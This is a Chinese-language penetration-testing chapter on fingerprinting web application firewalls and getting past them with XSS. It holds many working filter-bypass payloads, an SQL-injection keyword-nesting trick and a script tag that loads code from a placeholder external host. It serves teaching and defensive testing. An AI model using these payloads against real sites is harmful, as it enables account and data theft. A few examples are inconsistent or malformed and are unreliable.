# 规避Web应用防火墙（WAF）

## WAF 简介

Web应用防火墙（WAF）被视为防御应用攻击的第一道防线。它们常被称为下一代WAF，其定义随时间不断演进，最新的趋势是采用机器学习（ML）和人工智能（AI）的WAF。然而，尽管有这些进步，WAF在保护应用免受安全攻击方面的有效性仍然有限。这主要是因为WAF缺乏上下文感知能力，且大多数仍然严重依赖模式匹配。

在本章中，我们将讨论各种绕过WAF的前沿方法。本章将主要聚焦于XSS。尽管存在多种防御机制，XSS仍然普遍存在，部分原因在于JavaScript的灵活性。我们还将审视微软Internet Explorer（IE）为获得竞争优势而引入的特性如何经常被利用，导致在最终停用该浏览器并转向Microsoft Edge之前，花了大量精力加强其XSS过滤器。

需要注意的是，本章涵盖的所有payload都是当前的，并在现代浏览器上有效。然而，随着浏览器不断更新以对抗XSS方法，在阅读或出版本书时，某些payload可能已经过时。本章中“WAF”和“过滤器”术语可互换使用，指代同一概念。

## WAF检测方法

在探索绕过技术之前，了解WAF用于检测恶意流量的方法至关重要。现代WAF在高层面上通常依赖以下一种技术。

### 正则表达式

正则表达式是WAF常用的检测恶意流量的机制。它们可用于匹配输入模式。WAF规则集和签名的核心在很大程度上依赖于正则表达式，即设计用于匹配恶意输入中模式的一系列字符。虽然有效，但过度依赖正则表达式可能导致问题。一个值得注意的问题是正则表达式拒绝服务（ReDoS），其中过于复杂的表达式可能被利用来导致拒绝服务。

### 贝叶斯分析

与返回“真”或“假”判断的正则表达式不同，贝叶斯分析采用概率方法来评估payload为恶意的可能性。在这种方法中，每个payload根据各种特征被分配一个分数。如果该分数超过预定义阈值，则该payload被标记为潜在有害。管理员可以灵活地调整这些阈值，从而减少误报。

### 机器学习

检测恶意输入的一种相对较新的方法是利用机器学习。在该模型中，WAF使用良性payload和恶意payload进行训练。随着时间的推移，其系统在预测和识别攻击方面变得更加熟练，随着接收更多数据输入，其有效性不断提高。机器学习允许采用更动态、自适应的方式，随着新威胁的出现而发展，并减少对静态规则集的依赖。需要注意的是，此类WAF的有效性将取决于其训练所用数据集的质量。

## 理解WAF安全模型：白名单与黑名单

WAF主要在两种不同模式下运行，即白名单和黑名单。让我们简要讨论一下。

### 基于白名单的模型

白名单模型，也称为“接受已知良好”方法，允许定义允许的预定义输入。任何不在该预定义列表上的输入都被禁止。白名单模式在实际中并不可行。这主要是因为大多数Web应用是动态的，使得白名单在预测和列出所有合法输入方面极具挑战性。因此，由于这些实际困难，大多数WAF被配置为使用黑名单方法。

### 基于黑名单的模型

相反，黑名单基于“拒绝已知恶意”原则运作。它涉及定义禁止输入列表，同时允许其他所有内容。这种方法的一个主要问题是近乎无限的混淆可能性，特别是在XSS背景下，由于JavaScript的动态特性。此外，考虑到不同浏览器的各种特性和功能，维护一个有效的黑名单成为一项极具挑战性的任务。因此，严格的黑名单可能能够阻止攻击者，但会限制系统的功能和潜在可用性，并可能导致误报。

例如，以流行的WAF ModSecurity为例。当在输入中检测到“src”和“base64”等关键字时，它会将输入分类为恶意。这在经常使用此类术语的环境中尤其成问题，例如基于聊天的应用或社交媒体平台。

## 指纹识别WAF

测试WAF前的第一步是进行枚举。这将包括收集有关WAF的详细信息，例如类型、操作模式和版本。了解你面对的确切防火墙类型可以在实际渗透测试中节省大量时间。与其从头开始构建新的绕过方法，你可以研究现有的绕过方法并加以利用。这种方法符合《孙子兵法》中的战略原则：“知己知彼，百战不殆”。

无论设计如何，WAF都会留下各种痕迹和足迹，暴露其存在。常见迹象包括Cookie、HTTP响应中的独特模式，内容和头的重写，甚至DNS（域名系统）记录。来自WAF的某些指标的存在可能是有意的。一些WAF供应商可能不认为其系统的指纹识别或枚举是重大威胁，因此不会隐藏这些指标。相反，其他供应商可能有意揭示其存在以协助调试过程，特别是在误报情况下。此外，这些指标可能作为一种威慑形式或用于品牌推广目的。

以下是通过真实案例对WAF进行指纹识别的常用方法列表。

### Cookie值

某些WAF使用独特的Cookie名称，这可能作为指示防火墙存在的线索。Cookie用于WAF的各种原因，包括会话管理、机器人检测、速率限制等。

### Citrix Netscaler

Citrix Netscaler通过在HTTP通信期间插入其独特的Cookie来表明其存在。这些Cookie包含在HTTP响应头中，包括多种类型，特别是`ns_af`和`citrix_ns_id`等。

示例：
```http

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: ASPSESSIONIDACQSDCSC=HGJHINLNDMNFHABGPEPBNGFKC; ns_af=31+LrS3EE0BbxBV7AWDFIEHrn8A000; ns_af_target.br_=Tk1EQVFRU0RDUE0NF61GjizHRbTRNuNoOpbBOiKRET2gA&
Connection: keep-alive
Cache-Control: max-age=0
```

### Barracuda WAF

Barracuda是另一个通过添加自定义Cookie来暴露其身份的WAF示例。向受Barracuda保护的站点发送一个简单的非恶意GET请求将导致添加名为“barra_counter_session”和“BNI_Barracuda_LB_Cookie”的Cookie。

### HTTP响应码

有些WAF通过Cookie值暴露身份，而其他WAF则通过返回HTTP响应码（如403、406、419、500、501、999等）来响应恶意请求，从而暴露其身份。

#### ModSecurity

ModSecurity是Apache服务器上最广泛使用的开源WAF之一。当识别到恶意请求时，ModSecurity会响应“406 Not Acceptable”错误。此外，响应正文包含指示该错误由ModSecurity生成的信息，从而暴露其存在。

请求：
```http
GET /<script>alert(1);</script> HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0

Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

响应：
```http

Server: Apache
```

#### Sucuri WAF

Sucuri网站防火墙通过重定向到“Access Denied”页面来响应恶意请求。此页面还显示“Block ID”，指定触发阻止的规则编号。

#### CloudFlare WAF

Cloudflare对其存在透明，在Cookie、头和DNS记录等多个方面留下痕迹。当检测到恶意请求时，Cloudflare通常会将用户重定向到自定义页面，进一步表明其在网站保护中的作用。

### 连接关闭

检测WAF的另一种方法是检查它是否静默丢弃任何恶意请求。一个迹象是响应中的“close”连接选项，这意味着在完成响应后将终止或关闭连接。这种方法体现在针对暴力破解和拒绝服务攻击的ModSecurity实现中。在这种情况下，ModSecurity可能使用“close”连接选项作为防御措施，以保护服务器免受这些类型的威胁。

ModSecurity规则：
```log
SecAction phase:1,id:109,initcol:ip=%{REMOTE_ADDR},nolog
SecRule ARGS:login "!^$" "nolog,phase:1,id:110,setvar:ip.auth_attempt=+1,deprecatevar:ip.auth_attempt=25/120"
SecRule IP:AUTH_ATTEMPT "@gt 25" "log,drop,phase:1,id:111,msg:'Possible Brute Force Attack'"
```

此规则记录IP地址以监控基本身份验证尝试。在检测到120秒时间窗口内25次无效登录尝试后，该规则触发发送“FIN”数据包。该数据包有效地终止TCP/IP三次握手，这是建立网络连接的关键步骤，从而在指定时间范围内阻止来自该IP地址的进一步尝试。

## 绕过WAF——以XSS为例的方法论

最早的XSS速查表之一是安全研究人员Robert “RSnake” Hansen的“XSS Evasion Cheat Sheet”。然而，由于缺乏维护，该速查表最终过时了。目前最全面和最新的资源是“Portswigger’s XSS Cheat Sheet”。与许多其他速查表不同，该速查表的问题在于缺乏系统的方法论，这可能会让渗透测试人员和研究人员对使用特定payload的适当上下文和顺序感到困惑。

在本节中，我们旨在提供一种系统的方法来处理WAF。WAF通常依赖于基于正则表达式的黑名单。在这种情况下最有效的策略是正则表达式逆向。这涉及识别被WAF列入黑名单的输入，并尝试绕过它们。我们在此定义的payload专为在现代浏览器（特指Chrome和Firefox）上有效而定制。

### 注入无害HTML

确定WAF是否允许注入常见的HTML标签，如`<b>`、`<i>`和`<u>`。这些标签通常在使用WYSIWYG编辑器和评论表单的应用中被允许。目标是测试WAF是否过滤掉“<”和“>”尖括号。

#### 注意事项

1. 检查“<”和“>”标签是否被HTML编码，或是否被从输入中剥离。
2. 识别过滤器是移除“<”和“>”两个尖括号，还是仅移除其中一个。

仔细记录过滤器对注入的响应至关重要，注意任何变化，因为这可能表明存在不同的过滤规则或机制。

### 注入Script标签

`<script>`标签是注入JavaScript最常用的方法之一；因此，它无疑是会存在的首批规则之一。因此，为这个向量找到针对配置良好的过滤器的绕过方法具有挑战性，但对于测试过滤器的强度至关重要。然而，应选择阻力最小的路径，即在转向更复杂的payload之前**测试简单payload**。

当测试`<script>`标签时，如果基本注入被阻止，可以使用以下精心构造的payload来评估过滤器的有效性：

| Payload | 目的 | 兼容性 |
|---------|------|--------|
| `<sCRiPt>alert(1);</sCRipT>` | 确定过滤器是否无法识别payload中的大小写组合。 | Chrome, Firefox |
| `<script/tmgmtmgm>alert(1);</script>` | 测试过滤器是否查找“<script>”标签并允许随机字符。 | Chrome, Firefox |
| `<ScRiPt>alert(1);` | 不使用闭合标签注入 | 不会自动执行 |
| `<SCriPt>delete alert;alert(1)</sCriPt> //` | 使用delete关键字混淆过滤器 | 不会自动执行 |
| `<script>confirm(1);</script>` | 测试在开头的script标签后注入换行符的效果。 | Chrome, Firefox |

### 使用属性和相应标签进行测试

如果`<script>`标签被阻止，一种有效的替代策略是确定过滤器是否阻止**特定属性**，而不是尝试HTML标签。记住，目标是通过产生**最少噪音**（即提交最少数量的payload）来绕过过滤器。

如果这些属性通过过滤器，可以洞察哪些相应的HTML标签可能用于测试过滤器的有效性。要测试的关键属性包括但不限于：`src`、`srcdoc`、`data`、`form`、`formaction`、`code`和`href`。

#### 使用src属性测试

有许多HTML标签利用src属性和事件处理程序来执行JavaScript。以下是一些示例：

| 标签 | Payload | 兼容性 |
|------|---------|--------|
| img | `<img src=x onerror=prompt(1);>` | Chrome, Firefox |
| img | `<img/src=aaa.jpg onerror=prompt(1);>` | Chrome, Firefox |
| video | `<video src=x onerror=prompt(1);>` | Chrome, Firefox |
| audio | `<audio src=x onerror=prompt(1);>` | Chrome, Firefox |
| video | `<video><source onerror=alert(1)>` | Chrome, Firefox |
| iframe | `<iframe src=javascript:alert(1)>` | Chrome, Firefox |
| embed | `<embed src="javascript:alert(1)">` | Firefox |

#### 使用srcdoc属性测试

`srcdoc`属性是HTML5中`<iframe>`元素特有的。它用于定义iframe的HTML内容，允许直接在元素内设置内联HTML，而无需通过`src`属性加载外部资源。

| Payload | 兼容性 |
|---------|--------|
| `<iframe srcdoc="<script>alert('XSS')</script>"></iframe>` | Chrome, Firefox |
| `<iframe srcdoc="<iframe src='javascript:alert(&quot;XSS&quot;)'></iframe>"></iframe>` | Chrome, Firefox |
| `<iframe srcdoc="&lt;script&gt;alert(1);&lt;/script&gt"></iframe>` | Chrome, Firefox |

#### 使用action属性测试

下一步是测试“action”属性，该属性与form标签一起使用。

| 标签 | Payload | 兼容性 |
|------|---------|--------|
| Form with input tag | `<form action="javascript:alert('XSS')"><input type="submit"></form>` | Chrome, Firefox |
| Form with button tag | `<button form=x>xss<form id=x action="javascript:alert(1)"//` | Chrome, Firefox |
| Button and form tag | `<form><button formaction="javascript:alert(1)">Click me</button></form>` | Chrome, Firefox |

#### 使用formaction属性测试

`formaction`属性在`<button>`或`<input type="submit/image">`元素上指定，以覆盖关联表单的`action`属性。如果过滤器阻止`action`属性，你可以利用“formaction”属性来执行JavaScript：

| 标签 | Payload | 兼容性 |
|------|---------|--------|
| Form with button | `<form id="x" action="#"><button form="x" formaction="javascript:alert('XSS')">Click me</button></form>` | Chrome, Firefox |
| Form with input tag | `<form><input type="image" src=x formaction="javascript:alert(1);"></form>` | Chrome, Firefox |

### 使用伪协议测试

JavaScript协议通常用于执行JavaScript代码，但这不是唯一方法。另一个强大的机制是“数据URI”方案，它可以直接将各种类型的数据嵌入到Web文档中。

数据URI的基本结构如下：

示例：
```
data:[<mediatype>][;base64],<data>
```

媒体类型对我们特别感兴趣，通过将其设置为“text/html”，我们可以直接将HTML内容包含在URI中。以下是数据URI结构以执行JavaScript的通用示例：

示例：
```
data:text/html;base64,Base64EncodedData
```

使用此方法构造XSS payload，我们首先获取JavaScript代码，例如：

示例：
```html
<script>alert(1);</script>
```

将Adobe XSS向量编码为base64格式后，我们得到：

Payload:
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
```

此payload可在各种HTML标签和属性中使用。例如，它可用于锚点标签的`href`属性、图像或iframe的`src`属性，或接受URI的其他标签中，如“`<embed>`”、“`<object>`”或“`<svg>`”。以下payload使用Object标签执行“`alert(document.domain)`”属性：

示例：
```html
<object data="data:text/html;base64, PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==">
```

在空源上执行的数据URI，payload并未在页面上下文中执行，而是与空源关联。这是因为“data”伪协议对顶级导航无效，并且在不同源中运行。因此，此类payload缺乏实际用途。为了克服这一限制，将`<script>`标签与`src`属性结合，允许在同一上下文中执行。

Payload:
```html
<script src=data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs=></script>
```

此payload使用JavaScript代码“`alert(document.domain);`”的base64编码字符串。当浏览器解码并执行此脚本时，将在目标域的上下文中执行脚本。

> [MDN 同源策略文档：继承的源](https://mdn.org.cn/en-US/docs/Web/Security/Same-origin_policy#inherited_origins)
>
> 从具有 `about:blank` 或 `javascript:URL` 的页面执行的脚本会继承包含该 URL 的文档的源，因为这些类型的 URL 不包含有关源服务器的信息。
>
> `data`: URL 会获得一个新的、空的、安全上下文。

除了base64，还可以使用十进制NCR和十六进制等效项：

### 使用 ASCII 分隔符绕过

在ASCII字符集中，有几个字符被解释为空白，被称为**ASCII分隔符**。这些字符的识别可能因浏览器而异。根据上下文和payload，你可以将这些分隔符插入XSS Payload中。常用的ASCII分隔符包括：

| ASCII分隔符 | 代码点 |
|--------------|--------|
| 水平制表符 | 0x09 |
| 换行符 | 0x0A |
| 垂直制表符 | 0x0B |
| 换页符 | 0x0C |
| 回车符 | 0x0D |
| 空格 | 0x20 |

考虑以下正则表达式，它过滤掉关键字“on”后面跟空白和等号后的序列：

示例：
```
(?i)([\s\"';/0-9=]+on\w+\s*=)
```

此正则表达式使用`\s`元字符匹配空白字符，但可能不包括所有有效的ASCII空白字符。因此，像下面这样的payload可能被阻止：

示例：
```html
<a onmouseover=location='javascript:alert(1)'>click
```

然而，此正则表达式的问题在于“`\s`”元字符并不涵盖所有有效空白字符的列表。因此，我们可以注入一个有效的分隔符，如“%0C”来构造绕过。

示例：
```html
<a onmouseover%0C=location='javascript:alert(1)'>click
```

### 绕过WAF的实体解码

理解WAF的行为对于构造绕过至关重要。在某些情况下，WAF可能出于各种原因解码实体。在某些情况下，WAF可能作为其过滤过程的一部分解码实体。因此，如果已知过滤器阻止或剥离“<”和“>”等字符，则确定它是否也解码实体会很有帮助。

- **URL编码：** `%3Cb%3E` 表示`<b>`标签的URL编码形式。
- **HTML实体：** `&lt;b&gt;` 是`<b>`标签的HTML编码表示。
- **Unicode实体：** `\u003cb\u003e` 解码后表示`<b>`标签的字符。
- **十六进制实体：** `\x3cb\x3e` 是`<b>`标签的十六进制等效项。

观察过滤器对这些编码的响应可以揭示它是否将实体解码回其原始形式。

#### 案例研究：Laravel XSS过滤器绕过

这种方法的一个显著示例是我几年前发现的Laravel 4.1 XSS过滤器的绕过。该过滤器会将HTML实体解码为其原始形式。以下是用于测试WAF实体解码行为的输入：

Payload:
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">Clickhere</a>
```

提交后，过滤器解码实体，产生以下payload：

解码后的Payload:
```html
<a href="javascript:alert(1)">Clickhere</a>
```

由于存在关键字“JavaScript”和“alert”，输出触发警报，导致请求被阻止。为了规避这一点，原始payload被双重HTML实体编码，这本身在href上下文中不会形成有效的JavaScript执行payload：

POC:
```html
<a href="&#38;&#35;&#49;&#48;&#54;&#38;&#35;&#57;&#55;&#38;&#35;&#49;&#49;&#56;&#38;&#35;&#57;&#55;&#38;&#35;&#49;&#49;&#53;&#38;&#35;&#57;&#57;&#38;&#35;&#49;&#49;&#52;&#38;&#35;&#49;&#48;&#53;&#38;&#35;&#52;&#49;&#49;&#50;&#38;&#35;&#49;&#49;&#54;&#38;&#35;&#53;&#56;&#38;&#35;&#57;&#57;&#38;&#35;&#49;&#49;&#49;&#38;&#35;&#49;&#49;&#48;&#38;&#35;&#49;&#48;&#50;&#38;&#35;&#49;&#48;&#53;&#38;&#35;&#52;&#57;&#38;&#35;&#49;&#49;&#52;&#38;&#35;&#49;&#48;&#57;&#38;&#35;&#52;&#48;&#38;&#35;&#52;&#57;&#38;&#35;&#52;&#49;">Click here</a>
```

过滤器解码实体一次，未发现可疑关键字，因此允许以下payload通过。

解码后的Payload:
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">Clickhere</a>
```

此payload在“href”上下文中形成有效语法，并成功执行JavaScript。类似的技术可以应用于构造其他攻击类别的绕过，如SQL注入。

### 通过标签嵌套绕过递归过滤器 —— 使用冗余的预期被删除字符串

当处理过滤或剥离“`<script>`”等输入的WAF时，一种有效的规避技术是将这些标签相互嵌套。这种方法有时可以混淆过滤器，使其忽略嵌套结构，而浏览器可能仍将其处理为有效标签。考虑过滤器通过移除该字符串的出现来定位“`<script>`”标签的情况：

示例：
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

在此示例中，过滤器可能剥离内部的`<script>`和`</script>`字符串，但会保留外部部分。当浏览器处理HTML时，这可能导致`<script>`标签被连接。

对于其他攻击类别，如SQL注入攻击，也适用类似原则。攻击者可能使用标签嵌套来混淆过滤器，使其允许部分关键字通过，从而完成SQL命令。以下是一些示例：

示例：
```
UNIUNIONON SELSELECTECT username, password FROM users
```

在此示例中，插入部分关键字可能导致过滤器仅移除识别的部分（UNION、SELECT），留下有效的SQL命令。

### 通过大小写敏感性绕过过滤器

有些WAF可能将payload中的所有字符转换为大写。由于JavaScript是大小写敏感的，这会大大降低成功执行JavaScript的可能性。在过滤器强制转换为大写的场景中，以下向量可能非常有用：

示例1，从外部加载 JS：
```html
<SCRIPT/SRC=HTTP://LINKTOJS/></SCRIPT>
```

示例2，JS 伪协议内 URL 编码：
```html
<IFRAME/SRC=JAVASCRIPT:%61%6c%65%72%74%28%31%29 ></iframe> //
```

如果“JAVASCRIPT”方案被过滤器阻止，你可以利用以下payload绕过：

示例3，事件处理器内 HTML 编码：
```html
<SVG/ONLOAD=&#112;&#114;&#111;&#109;&#112;&#116(1)//
```

示例4，DATA 伪协议内 URL 编码：
```html
<SCRIPT/SRC=DATA:,%61%6c%65%72%74%28%31%29 ></SCRIPT>
```

示例5，DATA 伪协议内 base64 编码：

### 绕过不正确的输入转义

许多上下文感知过滤器通常尝试通过用反斜杠转义单引号或双引号来防止JavaScript执行，从而防止用户跳出上下文执行JavaScript。然而，这些过滤器可能无法转义反斜杠字符本身，这可以作为绕过机会。考虑用户输入在script标签内反射的示例：

示例：
```html
<script>
    var input = "teststring";
</script>
```

要跳出属性上下文并执行JavaScript，可以尝试payload“`;alert(1)//`”。过滤器会添加反斜杠来转义引号：

示例：
```html
<script>
    var input = "\";alert(1)//";
</script>
```

然而，如果过滤器不转义反斜杠字符，以下输入可能导致绕过：`\\";alert(1)//`。此输入有效，因为它使用额外的反斜杠来转义过滤器添加的反斜杠字符，从而导致成功绕过：

示例：
```html
<script>
    var input = "\\";alert(1)//";
</script>
```

### 使用DOM XSS绕过

WAF在服务器端运行，无法获知客户端请求。这一特性意味着，如果传统XSS可以转换为基于DOM的XSS，则可能绕过某些过滤器。此外，浏览器已停用客户端XSS过滤器，这使得规避过程更加容易。实现方式是通过使用`location.hash`属性，它表示URL中“#”之后的所有内容。让我们检查以下payload：

示例1，分割载荷为多部分，初始 JS 载荷未被阻止，被过滤部分放入哈希片段：
```http
http://www.example.com/xss=<svg/onload=eval(location.hash.slice(1))>?#alert(1)
```

此payload利用`location.hash.slice(1)`函数，该函数返回第一个位置的字符（因为`#`的位置为0），然后由`eval`函数进行评估，最终执行在`#`之后传递的payload。在此实例中，它将执行`alert(1)`。

如前所述，如果“eval”关键字被阻止，可以利用`setTimeout`、`setInterval`和其他之前讨论的技术等替代执行方法。这些替代汇点提供了一种即使在传统方法受限时也能执行脚本的方式。

浏览器会对通过`location.hash`传递的某些字符进行编码，在这种情况下，可以使用`unescape`和`atob`等函数。例如，以下payload利用“atob”属性解码在`location.hash`之后传递的base64字符串。

示例2，未被阻止的初始 JS 载荷 base64 解码位于 hash 片段的字符串：
```http
http://www.example.com/xss=<svg/onload=eval(atob(location.hash.slice(1)))>#YWxlcnQoMSkvLw==
```

“`document.body.innerHTML`”属性提供了另一种DOM操作方式。通过将此属性设置为`location.hash`，URL中`#`后面的任何内容都会被写入DOM。为了解码内容，使用`decodeURIComponent`。

示例3，未被阻止的初始 JS 载荷 URL 解码位于 hash 片段的字符串：
```http
http://www.example.com/xss=<svg/onload=document.body.innerHTML=decodeURIComponent(location.hash.slice(1))>//#<img%20src=x%20onerror=prompt(1)>
```

类似地，我们可以利用`location.hash[index]`属性来注入被禁止的字符。例如，考虑WAF过滤冒号“`:`”、开/闭括号“`()`”等字符的场景：

基本Payload:
```html
<svg/onload=location="javascript:alert(document.domain)">
```

由于存在被禁止的字符，WAF将阻止此payload。然而，我们可以通过在URL哈希的特定位置定义这些字符来规避此限制。

```
Location.hash[1] = ":"  // 设置为哈希后的第一个字符。
Location.hash[2] = "("  // 设置为第二个字符。
Location.hash[3] = ")"  // 设置在第三个位置。
```

示例4，未被阻止的初始 JS 载荷1提取 hash 片段的字符集构造 JS 载荷2：
```http
http://www.example.com/xss=<svg/onload="location='javascript)'+location.hash[1]+'alert'+location.hash[2]+'1'+location.hash[3]">#:()
```

然后在URL中，在`#`后附加`#:()`。

#### 被禁止关键字的示例

如果“javascript”和“alert”等关键字被禁止，可以使用带有正则表达式源的字符串连接作为替代。

示例5，`onload` 中的 JS 载荷1动态构造载荷2，载荷2在 `location` 执行：
```http
http://www.example.com/xss=<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]#:()
```

### 使用Window.Name属性

虽然涉及`location.hash`属性的向量在许多上下文中很有用，但一个显著的缺点是其在不同浏览器中的功能不一致。此外，某些过滤器和输入字段可能施加长度限制，仅允许一定数量的字符。这种限制可能阻碍许多XSS向量，尤其是在使用带有解码函数的`location.hash`时，因为它可能消耗过多的输入长度。在这种情况下，`window.name`属性可以作为替代。

`window.name`属性用于为窗口或选项卡分配“名称”。它作为同源策略（SOP）的例外。与大多数属性不同，`window.name`在在不同源之间导航页面时保留其值。这可以通过将`window.name`属性设置为XSS payload并在易受攻击页面的上下文中执行来利用。

为了说明这一点，请考虑以下利用`window.name`属性执行JavaScript的基本向量：

示例：
```html
<svg onload=eval(window.name)//
<svg/onload=location=name//
<body/onload=location=name//
<body/onload=location=write(top)//
```

#### 设置Name属性

要在易受攻击站点（example.com）的上下文中执行这些向量，我们必须跨源设置`window.name`属性。有多种方法可以实现这一点。

##### 示例1：使用IFRAME标签

以下向量通过iframe设置“name”属性：
```html
<iframe name="javascript:alert(1)" src="https://example.com/?xss=%22%3E%3Csvg/onload=location=name//">
```

此方法的一个限制是网站可能将X-Frame-Options配置为“SAMEORIGIN”或“DENY”，阻止iframe从不同源加载内容。为了克服这一点，可以使用`window.open`函数。

##### 示例2：WINDOW.OPEN函数

以下向量通过`window.open`函数设置“name”属性。此函数的第二个参数指定`window.name`属性的值，设置为我们的XSS payload。

Payload:
```html
<script>
window.open('http://example.com/?xss=<svg/onload=location=name//','javascript:alert(1)');
</script>
```

此向量明显的缺点是现代浏览器通常会在打开弹窗前请求用户许可，以应对侵入性弹窗广告。为了克服这一点，可以利用锚点标签。

##### 示例3：锚点标签

以下向量通过锚点标签设置“name”属性：

Payload:
```html
<a href="//target.com/?xss=<svg/onload=location=name//" target="javascript:alert(1)">CLICK</a>
```

### 绕过被列入黑名单的“Location”关键字

如你所见，“location”属性是此类payload执行的核心，因此经常被WAF列入黑名单，这大大减少了规避的选项。

“location”是“window”对象的一个属性，通常通过`window.location`访问。然而，为了绕过WAF过滤器，可以采用字符串连接技术。这在单引号或双引号被过滤掉的情况下特别有用。在这种情况下，可以利用正则表达式的“source”属性进行连接。以下是`window`属性的示例：

Window属性：
```http
http://www.example.com/xss=<svg/onload=window['loca'%2b'tion']=name//
```

如果“window”关键字被阻止，`document.location`属性提供了设置`window.name`属性的替代方法。

### 使用不同浏览器属性的变体

现代浏览器提供了多种其他属性来访问location对象，允许字符串连接以绕过过滤器。以下是一些演示此方法的变体：

示例：
```html
<svg/onload=top['loca'%2b'tion']=name//
<body/onload=this[/loca/.source%2b/tion/.source]=name//
<svg/onload=parent[/loca/.source%2b/tion/.source]=name//
<body/onload=self[/loca/.source%2b/tion/.source]=name//
```
